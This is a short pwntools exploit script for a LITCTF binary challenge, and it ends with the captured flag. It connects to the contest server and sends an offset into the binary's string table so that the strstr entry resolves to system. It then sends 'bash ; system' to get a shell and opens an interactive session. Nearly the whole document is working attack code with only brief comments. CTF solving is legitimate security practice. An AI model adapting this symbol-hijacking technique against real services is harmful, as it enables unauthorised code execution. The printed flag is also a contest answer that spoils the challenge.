# i didnt solve it in the ctf, i was too lazy :)

from pwn import *

elf = context.binary  = ELF("main")

# p = process(aslr=False)
p = remote("litctf.org", 31790)


# this will point into the strtab, its offseted to overwrite strstr
p.sendline(str(0x1f97 - 7))
# gonna overwrite strstr entry with system and also call bash 
p.sendline("bash ; system")

p.interactive()

# LITCTF{y34h_p4tch3LF_Do1ng_p47cheLf_7h1ngs}